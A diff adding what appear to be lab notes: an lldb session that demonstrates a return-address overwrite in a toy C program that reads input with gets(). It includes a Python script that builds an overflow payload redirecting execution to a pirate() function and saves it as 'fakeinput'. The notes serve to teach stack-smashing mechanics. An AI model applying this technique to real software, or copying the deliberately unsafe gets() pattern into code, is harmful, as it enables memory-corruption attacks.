@@ -1,0 +1,409 @@
+#----------- START HERE
+# Compile witrh option -fno-stack-*
+
+lldb bin/helloReturnCapture
+
+b main
+b get_name
+
+run
+
+   30  	}
+   31
+   32  	int main() {
+-> 33  		char *name=NULL;
+   34
+   35  		name = get_name();
+   36
+
+
+(lldb) dd
+helloReturnCapture, main
+    0    0x100003ef0 <+0>:    subq  $0x18,  %rsp
+    1    0x100003ef4 <+4>:    movl  $0x0,  0x14(%rsp)
+->  2    0x100003efc <+12>:   movq  $0x0,  0x8(%rsp)
+   *3    0x100003f05 <+21>:   callq 0x100003ec0  ; get_name
+    4    0x100003f0a <+26>:   movq  %rax,  0x8(%rsp)
+    5    0x100003f0f <+31>:   cmpq  $0x0,  0x8(%rsp)
+   *6    0x100003f15 <+37>:   je    0x100003f38 <+72> at helloReturnCapture.c:41:2
+    7    0x100003f1b <+43>:   movq  0x8(%rsp),  %rsi
+    8    0x100003f20 <+48>:   leaq  0x79(%rip),  %rdi "\nHello %s\n"
+    9    0x100003f27 <+55>:   movb  $0x0,  %al
+   *10   0x100003f29 <+57>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
+    11   0x100003f2e <+62>:   movq  0x8(%rsp),  %rdi
+   *12   0x100003f33 <+67>:   callq 0x100003f40  ; (__TEXT.__stubs) free
+    13   0x100003f38 <+72>:   xorl  %eax,  %eax
+    14   0x100003f3a <+74>:   addq  $0x18,  %rsp
+   *15   0x100003f3e <+78>:   retq
+
+
+# Remember
+# Return address from the fake is not the normal return address  0x100003f0a
+# but    0x100003f3e  (Line 15)
+
+(lldb) p/x $sp
+(unsigned long) $0 = 0x0000000304103530
+
+# print portion of the stack
+
+(lldb) x/64xb $sp
+0x304103530: 0x40 0xac 0x49 0x08 0x01 0x00 0x00 0x00
+0x304103538: 0xf0 0x3e 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103558: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103560: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+
+(lldb) cont
+
+   20  	char* get_name(){
+   21  		char buf[15];
+   22
+-> 23  		printf("Please insert your surname (15 characters max): ");
+   24
+   25  		//scanf("%s",buf);
+   26  	        // We use the function gets(), which is vurlnerable to buffer overflow
+
+# 2 times next
+
+warning: this program uses gets(), which is unsafe.
+Please insert your surname (15 characters max): Peter
+
+   26  	        // We use the function gets(), which is vurlnerable to buffer overflow
+   27  		gets(buf);
+   28
+-> 29  		return strdup(buf);  // return a copy of the name on the heap
+   30  	}
+
+(lldb) x/64xb $sp
+0x304103510: 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103518: 0x00 0x50 0x65 0x74 0x65 0x72 0x00 0x00  buf starts at 0x304103519
+0x304103520: 0x53 0x00 0x66 0xe7 0x0a 0xb9 0x7f 0xeb
+0x304103528: 0x0a 0x3f 0x00 0x00 0x01 0x00 0x00 0x00  ret addr to main
+0x304103530: 0x40 0xac 0x49 0x08 0x01 0x00 0x00 0x00
+0x304103538: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00  ret addr to caller of main
+
+--- scratch begin
+
+(lldb) x/64xb $sp
+0x304103528: 0x0a 0x3f 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103530: 0x40 0xac 0x49 0x08 0x01 0x00 0x00 0x00
+0x304103538: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+ni
+
+(lldb) dd
+helloReturnCapture, main
+    0    0x100003ef0 <+0>:    subq  $0x18,  %rsp
+    1    0x100003ef4 <+4>:    movl  $0x0,  0x14(%rsp)
+    2    0x100003efc <+12>:   movq  $0x0,  0x8(%rsp)
+   *3    0x100003f05 <+21>:   callq 0x100003ec0  ; get_name
+->  4    0x100003f0a <+26>:   movq  %rax,  0x8(%rsp)
+    5    0x100003f0f <+31>:   cmpq  $0x0,  0x8(%rsp)
+   *6    0x100003f15 <+37>:   je    0x100003f38 <+72> at helloReturnCapture.c:41:2
+    7    0x100003f1b <+43>:   movq  0x8(%rsp),  %rsi
+    8    0x100003f20 <+48>:   leaq  0x79(%rip),  %rdi "\nHello %s\n"
+    9    0x100003f27 <+55>:   movb  $0x0,  %al
+   *10   0x100003f29 <+57>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
+    11   0x100003f2e <+62>:   movq  0x8(%rsp),  %rdi
+   *12   0x100003f33 <+67>:   callq 0x100003f40  ; (__TEXT.__stubs) free
+    13   0x100003f38 <+72>:   xorl  %eax,  %eax
+    14   0x100003f3a <+74>:   addq  $0x18,  %rsp
+   *15   0x100003f3e <+78>:   retq
+
+(lldb) x/64xb $sp
+0x304103530: 0x40 0xac 0x49 0x08 0x01 0x00 0x00 0x00
+0x304103538: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+10x ni
+
+(lldb) dd
+helloReturnCapture, main
+    0    0x100003ef0 <+0>:    subq  $0x18,  %rsp
+    1    0x100003ef4 <+4>:    movl  $0x0,  0x14(%rsp)
+    2    0x100003efc <+12>:   movq  $0x0,  0x8(%rsp)
+   *3    0x100003f05 <+21>:   callq 0x100003ec0  ; get_name
+    4    0x100003f0a <+26>:   movq  %rax,  0x8(%rsp)
+    5    0x100003f0f <+31>:   cmpq  $0x0,  0x8(%rsp)
+   *6    0x100003f15 <+37>:   je    0x100003f38 <+72> at helloReturnCapture.c:41:2
+    7    0x100003f1b <+43>:   movq  0x8(%rsp),  %rsi
+    8    0x100003f20 <+48>:   leaq  0x79(%rip),  %rdi "\nHello %s\n"
+    9    0x100003f27 <+55>:   movb  $0x0,  %al
+   *10   0x100003f29 <+57>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
+    11   0x100003f2e <+62>:   movq  0x8(%rsp),  %rdi
+   *12   0x100003f33 <+67>:   callq 0x100003f40  ; (__TEXT.__stubs) free
+    13   0x100003f38 <+72>:   xorl  %eax,  %eax
+->  14   0x100003f3a <+74>:   addq  $0x18,  %rsp
+   *15   0x100003f3e <+78>:   retq
+(lldb)  x/64xb $sp
+0x304103530: 0x40 0xac 0x49 0x08 0x01 0x00 0x00 0x00
+0x304103538: 0x00 0x80 0x00 0x00 0x00 0x60 0x00 0x00
+0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+# ni
+(lldb) dd
+helloReturnCapture, main
+    0    0x100003ef0 <+0>:    subq  $0x18,  %rsp
+    1    0x100003ef4 <+4>:    movl  $0x0,  0x14(%rsp)
+    2    0x100003efc <+12>:   movq  $0x0,  0x8(%rsp)
+   *3    0x100003f05 <+21>:   callq 0x100003ec0  ; get_name
+    4    0x100003f0a <+26>:   movq  %rax,  0x8(%rsp)
+    5    0x100003f0f <+31>:   cmpq  $0x0,  0x8(%rsp)
+   *6    0x100003f15 <+37>:   je    0x100003f38 <+72> at helloReturnCapture.c:41:2
+    7    0x100003f1b <+43>:   movq  0x8(%rsp),  %rsi
+    8    0x100003f20 <+48>:   leaq  0x79(%rip),  %rdi "\nHello %s\n"
+    9    0x100003f27 <+55>:   movb  $0x0,  %al
+   *10   0x100003f29 <+57>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
+    11   0x100003f2e <+62>:   movq  0x8(%rsp),  %rdi
+   *12   0x100003f33 <+67>:   callq 0x100003f40  ; (__TEXT.__stubs) free
+    13   0x100003f38 <+72>:   xorl  %eax,  %eax
+    14   0x100003f3a <+74>:   addq  $0x18,  %rsp
+-> *15   0x100003f3e <+78>:   retq
+
+(lldb)  x/64xb $sp
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+
+
+--- scratch end
+
+--- the adhoc script 2 with dump to file
+
+(lldb) script
+
+def store_arch_word_in_blob(blob, size, offset, value):
+    blob[offset:offset+size] = value
+
+from __future__ import print_function
+import binascii
+
+frame = lldb.frame
+process = lldb.process
+target = lldb.target
+
+arch_size = process.GetAddressByteSize()
+pirate_addr = target.EvaluateExpression('&pirate').GetValueAsUnsigned()
+
+addr_buf = frame.FindVariable('buf').GetAddress().load_addr
+addr_return_to_main = addr_buf + 15
+
+# create a faked stack content down to address 0x304103530
+# from information read from start of buf downto return address from main at 0x304103548
+# (lldb) expression `sizeof(buf)`
+# (int) $20 = 15
+
+bytes_to_read = 15 + 5 * arch_size
+
+# Read the entire stack blob
+err = lldb.SBError()
+stack_blob = process.ReadMemory(addr_buf,bytes_to_read, err)
+
+# create new byte array blob of appropriate size
+size_of_buf = 15
+size_to_fake = size_of_buf + 3 * arch_size
+newblob = [0] * size_to_fake
+
+# override the buffer with 'A' characters; buf is terminated by initialization with 0
+for offset in range(0,size_of_buf-1,1):
+    newblob[offset] = 0x41
+
+offset_ret_to_main  = size_of_buf
+# fake the start address of pirate() as return address
+store_arch_word_in_blob(newblob, arch_size, offset_ret_to_main, list(pirate_addr.to_bytes(arch_size, byteorder = 'little')))
+# write the faked return address to main: 0x100003f3e
+store_arch_word_in_blob(newblob, arch_size, offset_ret_to_main + 1* arch_size, list((int(0x100003f3e).to_bytes(arch_size, byteorder = 'little'))))
+# move return address to function that called main
+store_arch_word_in_blob(newblob, arch_size, offset_ret_to_main + 2* arch_size, stack_blob[offset_ret_to_main+4*arch_size:offset_ret_to_main+5*arch_size])
+
+
+# Write newblob to file
+newbuf = bytearray(newblob)
+with open ("fakeinput", "wb") as bindata:
+    bindata.write(newbuf)
+
+
+# Write the new stack blob to memory
+err = lldb.SBError()
+stack_blob = process.WriteMemory(addr_buf,newbuf, err)
+
+# exit script mode
+
+(lldb) x/64xb $sp
+0x304103510: 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x00
+0x304103518: 0x00 0x41 0x41 0x41 0x41 0x41 0x41 0x41
+0x304103520: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x00
+0x304103528: 0xa0 0x3e 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103530: 0x3e 0x3f 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103538: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+
+(lldb) dd
+
+(lldb) dd
+helloReturnCapture, get_name
+    0    0x100003ec0 <+0>:    subq  $0x18,  %rsp
+    1    0x100003ec4 <+4>:    leaq  0xa4(%rip),  %rdi "Please insert your surname (15 characters max): "
+    2    0x100003ecb <+11>:   movb  $0x0,  %al
+   *3    0x100003ecd <+13>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
+    4    0x100003ed2 <+18>:   leaq  0x9(%rsp),  %rdi
+   *5    0x100003ed7 <+23>:   callq 0x100003f46  ; (__TEXT.__stubs) gets
+->  6    0x100003edc <+28>:   leaq  0x9(%rsp),  %rdi
+   *7    0x100003ee1 <+33>:   callq 0x100003f52  ; (__TEXT.__stubs) strdup
+    8    0x100003ee6 <+38>:   addq  $0x18,  %rsp
+   *9    0x100003eea <+42>:   retq
+    10   0x100003eeb <+43>:   nopl  (%rax, %rax)
+
+# 3* ni
+
+(lldb) dd
+helloReturnCapture, get_name
+    0    0x100003ec0 <+0>:    subq  $0x18,  %rsp
+    1    0x100003ec4 <+4>:    leaq  0xa4(%rip),  %rdi "Please insert your surname (15 characters max): "
+    2    0x100003ecb <+11>:   movb  $0x0,  %al
+   *3    0x100003ecd <+13>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
+    4    0x100003ed2 <+18>:   leaq  0x9(%rsp),  %rdi
+   *5    0x100003ed7 <+23>:   callq 0x100003f46  ; (__TEXT.__stubs) gets
+    6    0x100003edc <+28>:   leaq  0x9(%rsp),  %rdi
+   *7    0x100003ee1 <+33>:   callq 0x100003f52  ; (__TEXT.__stubs) strdup
+    8    0x100003ee6 <+38>:   addq  $0x18,  %rsp
+-> *9    0x100003eea <+42>:   retq
+    10   0x100003eeb <+43>:   nopl  (%rax, %rax)
+
+(lldb) x/32bx $sp
+
+0x304103528: 0xa0 0x3e 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103530: 0x3e 0x3f 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103538: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00
+
+# ni
+
+Process 5998 stopped
+* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over
+    frame #0: 0x0000000100003ea0 helloReturnCapture` pirate  at helloReturnCapture.c:16
+   13  	#include <string.h>
+   14  	#include <stdlib.h>
+   15
+-> 16  	void pirate(){
+   17  		printf("Your have been hacked\n");
+   18  	}
+   19
+
+(lldb) dd
+helloReturnCapture, pirate
+->  0    0x100003ea0 <+0>:    pushq %rax
+    1    0x100003ea1 <+1>:    leaq  0xb0(%rip),  %rdi "You have been hacked!\n"
+    2    0x100003ea8 <+8>:    movb  $0x0,  %al
+   *3    0x100003eaa <+10>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
+    4    0x100003eaf <+15>:   popq  %rax
+   *5    0x100003eb0 <+16>:   retq
+    6    0x100003eb1 <+17>:   nopw  %cs:(%rax, %rax)
+    7    0x100003ebb <+27>:   nopl  (%rax, %rax)
+
+# 5*ni
+
+You have been hacked!
+Process 1067 stopped
+* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over
+    frame #0: 0x0000000100003eaf helloReturnCapture` pirate  + 15 at helloReturnCapture.c:18
+   15
+   16  	void pirate(){
+   17  		printf("You have been hacked!\n");
+-> 18  	}
+   19
+   20  	char* get_name(){
+   21  		char buf[15];
+
+
+(lldb) dd
+
+helloReturnCapture, pirate
+    0    0x100003ea0 <+0>:    pushq %rax
+    1    0x100003ea1 <+1>:    leaq  0xb0(%rip),  %rdi "You have been hacked!\n"
+    2    0x100003ea8 <+8>:    movb  $0x0,  %al
+   *3    0x100003eaa <+10>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
+    4    0x100003eaf <+15>:   popq  %rax
+-> *5    0x100003eb0 <+16>:   retq
+    6    0x100003eb1 <+17>:   nopw  %cs:(%rax, %rax)
+    7    0x100003ebb <+27>:   nopl  (%rax, %rax)
+
+(lldb) 
+
+(lldb) x/32bx $sp
+0x304103530: 0x3e 0x3f 0x00 0x00 0x01 0x00 0x00 0x00
+0x304103538: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+
+
+# ni
+
+#
+# Note:
+# We returned to the fake return address in main()
+
+(lldb) dd
+helloReturnCapture, main
+    0    0x100003ef0 <+0>:    subq  $0x18,  %rsp
+    1    0x100003ef4 <+4>:    movl  $0x0,  0x14(%rsp)
+    2    0x100003efc <+12>:   movq  $0x0,  0x8(%rsp)
+   *3    0x100003f05 <+21>:   callq 0x100003ec0  ; get_name
+    4    0x100003f0a <+26>:   movq  %rax,  0x8(%rsp)
+    5    0x100003f0f <+31>:   cmpq  $0x0,  0x8(%rsp)
+   *6    0x100003f15 <+37>:   je    0x100003f38 <+72> at helloReturnCapture.c:41:2
+    7    0x100003f1b <+43>:   movq  0x8(%rsp),  %rsi
+    8    0x100003f20 <+48>:   leaq  0x79(%rip),  %rdi "\nHello %s\n"
+    9    0x100003f27 <+55>:   movb  $0x0,  %al
+   *10   0x100003f29 <+57>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
+    11   0x100003f2e <+62>:   movq  0x8(%rsp),  %rdi
+   *12   0x100003f33 <+67>:   callq 0x100003f40  ; (__TEXT.__stubs) free
+    13   0x100003f38 <+72>:   xorl  %eax,  %eax
+    14   0x100003f3a <+74>:   addq  $0x18,  %rsp
+-> *15   0x100003f3e <+78>:   retq
+
+(lldb) x/32bx $sp
+0x304103538: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00
+0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
+0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+
+(lldb) cont
+Process 1067 resuming
+Process 1067 exited with status = 0 (0x00000000)
+
+#------------
+
+$ lldb bin/helloReturnCapture
+
+(lldb) process launch -i fakeinput
+
+warning: this program uses gets(), which is unsafe.
+Please insert your surname (15 characters max): You have been hacked!
+Process 7819 exited with status = 48 (0x00000030)
+
+
+#------------
+# However, running without debugger results in a seg fault :-(
+
+cat fakeinput | bin/helloReturnCapture
+
+#> output
+warning: this program uses gets(), which is unsafe.
+Segmentation fault: 11
+
+
